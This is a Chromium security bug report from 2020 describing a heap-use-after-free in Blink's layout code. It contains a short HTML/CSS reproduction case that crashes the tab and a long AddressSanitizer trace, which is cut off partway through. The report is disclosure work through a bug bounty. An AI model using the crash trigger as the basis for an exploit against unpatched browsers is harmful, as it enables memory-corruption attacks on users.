# Security: heap-use-after-free in AllowFrom

| Field | Value |
|-------|-------|
| **Issue ID** | [40052773](https://issues.chromium.org/issues/40052773) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Layout |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ho...@gmail.com |
| **Assignee** | ko...@chromium.org |
| **Created** | 2020-07-04 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**

**VERSION**  

Chrome Version: 86.0.4193.0 (64bit) + dev (it also crashes on the official dev release channel with version 85.0.4181.8 + dev)  

Operating System: Linux-4.15.0-88-generic-x86\_64-with-Ubuntu-18.04-bionic

**REPRODUCTION CASE**

<style>
d,\\*,i{display:flex}
c,\\*{contain:strict}
\\*,c{outline-style:auto
</style>

<object data=t></object>  

<object data="u"t></object>  

<data>  

Lauris pharetra et ultrices.  

<iframe></iframe>  

</data>  

</d>  

<del></del>  

<bdi>

 <script></script>
</bdi>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

=================================================================  

==13720==ERROR: AddressSanitizer: heap-use-after-free on address 0x6120000109c0 at pc 0x55d655d19e55 bp 0x7ffec2f8f6f0 sp 0x7ffec2f8f6e8  

READ of size 8 at 0x6120000109c0 thread T0  

#0 0x55d655d19e54 in AllowFrom third\_party/blink/renderer/core/layout/layout\_block\_flow.h:1040:19  

#1 0x55d655d19e54 in IsA<blink::LayoutBlockFlow, blink::LayoutObject> third\_party/blink/renderer/platform/wtf/casting.h:67:10  

#2 0x55d655d19e54 in IsA<blink::LayoutBlockFlow, blink::LayoutObject> third\_party/blink/renderer/platform/wtf/casting.h:72:18  

#3 0x55d655d19e54 in DynamicTo<blink::LayoutBlockFlow, blink::LayoutObject> third\_party/blink/renderer/platform/wtf/casting.h:114:10  

#4 0x55d655d19e54 in blink::NGPhysicalFragment::PostLayout() const third\_party/blink/renderer/core/layout/ng/ng\_physical\_fragment.cc:324:29  

#5 0x55d655d13cdc in PostLayoutOrCurrent third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.h:70:53  

#6 0x55d655d13cdc in operator\* third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.h:53:49  

#7 0x55d655d13cdc in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:137:26  

#8 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#9 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#10 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#11 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#12 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#13 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#14 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#15 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#16 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#17 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#18 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#19 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#20 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#21 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#22 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#23 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#24 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#25 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#26 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#27 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#28 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#29 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#30 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#31 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#32 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#33 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#34 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#35 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#36 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#37 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#38 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#39 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#40 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#41 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#42 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#43 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#44 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#45 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#46 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#47 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#48 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#49 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#50 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#51 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#52 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#53 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#54 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#55 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#56 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#57 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#58 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#59 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#60 0x55d655d154d1 in blink::NGPhysicalContainerFragment::AddOutlineRectsForDescendant(blink::NGLink const&, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:272:23  

#61 0x55d655d14164 in blink::NGPhysicalContainerFragment::AddOutlineRectsForNormalChildren(WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*, blink::PhysicalOffset const&, blink::NGOutlineType, blink::LayoutBoxModelObject const\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_container\_fragment.cc:155:5  

#62 0x55d655d0c09e in blink::NGPhysicalBoxFragment::AddSelfOutlineRects(blink::PhysicalOffset const&, blink::NGOutlineType, WTF::Vector<blink::PhysicalRect, 0u, WTF::PartitionAllocator>\*) const third\_party/blink/renderer/core/layout/ng/ng\_physical\_box\_fragment.cc:488:5  

#63 0x55d65630b269 in blink::NGFragmentPainter::PaintOutline(blink::PaintInfo const&, blink::PhysicalOffset const&) third\_party/blink/renderer/core/paint/ng/ng\_fragment\_painter.cc:25:12  

#64 0x55d6562e3bde in blink::NGBoxFragmentPainter::PaintObject(blink::PaintInfo const&, blink::PhysicalOffset const&, bool) third\_party/blink/renderer/core/paint/ng/ng\_box\_fragment\_painter.cc:623:10  

#65 0x55d6562e1df3 in blink::NGBoxFragmentPainter::PaintInternal(blink::PaintInfo const&) third\_party/blink/renderer/core/paint/ng/ng\_box\_fragment\_painter.cc:472:5  

#66 0x55d655ba9ebf in blink::LayoutNGMixin[blink::LayoutBlock](javascript:void(0);)::Paint(blink::PaintInfo const&) const third\_party/blink/renderer/core/layout/ng/layout\_ng\_mixin.cc:47:37  

#67 0x55d6563a4c05 in blink::PaintLayerPainter::PaintFragmentWithPhase(blink::PaintPhase, blink::PaintLayerFragment const&, blink::GraphicsContext&, blink::ClipRect const&, blink::PaintLayerPaintingInfo const&, unsigned int) third\_party/blink/renderer/core/paint/paint\_layer\_painter.cc:726:36  

#68 0x55d65639e1c6 in operator() third\_party/blink/renderer/core/paint/paint\_layer\_painter.cc:800:11  

#69 0x55d65639e1c6 in ForAllFragments<(lambda at ../../third\_party/blink/renderer/core/paint/paint\_layer\_painter.cc:798:33)> third\_party/blink/renderer/core/paint/paint\_layer\_painter.cc:604:5  

#70 0x55d65639e1c6 in PaintSelfOutlineForFragments third\_party/blink/renderer/core/paint/paint\_layer\_painter.cc:797:3  

#71 0x55d65639e1c6 in blink::PaintLayerPainter::PaintLayerContents(blink::GraphicsContext&, blink::PaintLayerPaintingInfo const&, unsigned int) third\_party/blink/renderer/core/paint/paint\_layer\_painter.cc:504:7  

#72 0x55d65639bb90 in blink::PaintLayerPainter::Paint(blink::GraphicsContext&, blink::PaintLayerPaintingInfo const&, unsigned int) third\_party/blink/renderer/core/paint/paint\_layer\_painter.cc:106:10  

#73 0x55d6563a1cfb in blink::PaintLayerPainter::PaintChildren(blink::PaintLayerIteration, blink::GraphicsContext&, blink::PaintLayerPaintingInfo const&, unsigned int) third\_party/blink/renderer/core/paint/paint\_layer\_painter.cc:634:35  

#74 0x55d65639e3af in blink::PaintLayerPainter::PaintLayerContents(blink::GraphicsContext&, blink::PaintLayerPaintingInfo const&, unsigned int) third\_party/blink/renderer/core/paint/paint\_layer\_painter.cc:509:11  

#75 0x55d656226d17 in blink::CompositedLayerMapping::DoPaintTask(blink::GraphicsLayerPaintInfo const&, blink::GraphicsLayer const&, unsigned int, blink::GraphicsContext&, blink::IntRect const&) const third\_party/blink/renderer/core/paint/compositing/composited\_layer\_mapping.cc:1731:10  

#76 0x55d65622a6da in blink::CompositedLayerMapping::PaintContents(blink::GraphicsLayer const\*, blink::GraphicsContext&, unsigned int, blink::IntRect const&) const third\_party/blink/renderer/core/paint/compositing/composited\_layer\_mapping.cc:2034:5  

#77 0x55d652c94235 in blink::GraphicsLayer::PaintWithoutCommit(blink::IntRect const\*) third\_party/blink/renderer/platform/graphics/graphics\_layer.cc:390:11  

#78 0x55d652c92ac2 in blink::GraphicsLayer::Paint() third\_party/blink/renderer/platform/graphics/graphics\_layer.cc:310:7  

#79 0x55d652c9235f in blink::GraphicsLayer::PaintRecursivelyInternal(WTF::Vector<blink::GraphicsLayer\*, 0u, WTF::PartitionAllocator>&) third\_party/blink/renderer/platform/graphics/graphics\_layer.cc:294:9  

#80 0x55d652c9255f in blink::GraphicsLayer::PaintRecursivelyInternal(WTF::Vector<blink::GraphicsLayer\*, 0u, WTF::PartitionAllocator>&) third\_party/blink/renderer/platform/graphics/graphics\_layer.cc:299:12  

#81 0x55d652c91d81 in blink::GraphicsLayer::PaintRecursively() third\_party/blink/renderer/platform/graphics/graphics\_layer.cc:269:3  

#82 0x55d6545ef957 in PaintGraphicsLayerRecursively third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2821:25  

#83 0x55d6545ef957 in blink::LocalFrameView::PaintTree() third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2910:22  

#84 0x55d6545eaff3 in blink::LocalFrameView::RunPaintLifecyclePhase() third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2634:5  

#85 0x55d6545e9086 in blink::LocalFrameView::UpdateLifecyclePhasesInternal(blink::DocumentLifecycle::LifecycleState) third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2454:3  

#86 0x55d6545e5465 in blink::LocalFrameView::UpdateLifecyclePhases(blink::DocumentLifecycle::LifecycleState, blink::DocumentUpdateReason) third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2363:3  

#87 0x55d6545e4d6f in blink::LocalFrameView::UpdateAllLifecyclePhases(blink::DocumentUpdateReason) third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2132:54  

#88 0x55d65611afe9 in blink::PageAnimator::UpdateAllLifecyclePhases(blink::LocalFrame&, blink::DocumentUpdateReason) third\_party/blink/renderer/core/page/page\_animator.cc:146:9  

#89 0x55d65423883e in blink::WebViewImpl::UpdateLifecycle(blink::WebLifecycleUpdate, blink::DocumentUpdateReason) third\_party/blink/renderer/core/exported/web\_view\_impl.cc:1582:3  

#90 0x55d6547d2307 in blink::WebViewFrameWidget::UpdateLifecycle(blink::WebLifecycleUpdate, blink::DocumentUpdateReason) third\_party/blink/renderer/core/frame/web\_view\_frame\_widget.cc:128:14  

#91 0x55d65b40e786 in content::RenderViewTest::LoadHTMLWithUrlOverride(char const\*, char const\*) content/public/test/render\_view\_test.cc:337:43  

#92 0x55d640293669 in LoadHTML content/test/fuzzer/fuzzer\_support.h:27:21  

#93 0x55d640293669 in LLVMFuzzerTestOneInput content/test/fuzzer/renderer\_fuzzer.cc:22:17  

#94 0x55d640294c13 in main testing/libfuzzer/unittest\_main.cc:57:5  

#95 0x7fc62d871b96 in \_\_libc\_start\_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310

0x6120000109c0 is located 0 bytes inside of 280-byte region [0x6120000109c0,0x612000010ad8)  

freed by thread T0 here:  

#0 0x55d640266dbd in free /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cpp:123:3  

#1 0x55d65577e770 in Free base/allocator/partition\_allocator/partition\_alloc.h:582:3  

#2 0x55d65577e770 in blink::LayoutObject::operator delete(void\*) third\_party/blink/renderer/core/layout/layout\_object.cc:196:39  

#3 0x55d65460bde7 in Release base/memory/scoped\_refptr.h:322:8  

#4 0x55d65460bde7 in ~scoped\_refptr base/memory/scoped\_refptr.h:224:7  

#5 0x55d65460bde7 in DeleteAllBucketsAndDeallocate third\_party/blink/renderer/platform/wtf/hash\_table.h:1718:21  

#6 0x55d65460bde7 in WTF::HashTable<scoped\_refptr[blink::LayoutEmbeddedObject](javascript:void(0);), scoped\_refptr[blink::LayoutEmbeddedObject](javascript:void(0);), WTF::IdentityExtractor, WTF::RefPtrHash[blink::LayoutEmbeddedObject](javascript:void(0);), WTF::HashTraits<scoped\_refptr[blink::LayoutEmbeddedObject](javascript:void(0);) >, WTF::HashTraits<scoped\_refptr[blink::LayoutEmbeddedObject](javascript:void(0);) >, WTF::PartitionAllocator>::Finalize() third\_party/blink/renderer/platform/wtf/hash\_table.h:761:5  

#7 0x55d6545e1dbb in ~ConditionalDestructor third\_party/blink/renderer/platform/wtf/conditional\_destructor.h:24:59  

#8 0x55d6545e1dbb in ~HashSet third\_party/blink/renderer/platform/wtf/hash\_set.h:42:7  

#9 0x55d6545e1dbb in blink::LocalFrameView::UpdatePlugins() third\_party/blink/renderer/core/frame/local\_frame\_view.cc:1887:1  

#10 0x55d6545c7a56 in blink::LocalFrameView::UpdatePluginsTimerFired(blink::TimerBase\*) third\_party/blink/renderer/core/frame/local\_frame\_view.cc:1892:9  

#11 0x55d652974a8a in blink::TimerBase::RunInternal() third\_party/blink/renderer/platform/timer.cc:152:3  

#12 0x55d652975280 in Invoke<void (blink::TimerBase::\*)(), base::WeakPtr[blink::TimerBase](javascript:void(0);)> base/bind\_internal.h:498:12  

#13 0x55d652975280 in MakeItSo<void (blink::TimerBase::\*)(), base::WeakPtr[blink::TimerBase](javascript:void(0);)> base/bind\_internal.h:657:5  

#14 0x55d652975280 in RunImpl<void (blink::TimerBase::\*)(), std::\_\_1::tuple<base::WeakPtr[blink::TimerBase](javascript:void(0);) >, 0> base/bind\_internal.h:710:12  

#15 0x55d652975280 in base::internal::Invoker<base::internal::BindState<void (blink::TimerBase::\*)(), base::WeakPtr[blink::TimerBase](javascript:void(0);) >, void ()>::RunOnce(base::internal::BindStateBase\*) base/bind\_internal.h:679:12  

#16 0x55d647a2741f in Run base/callback.h:99:12  

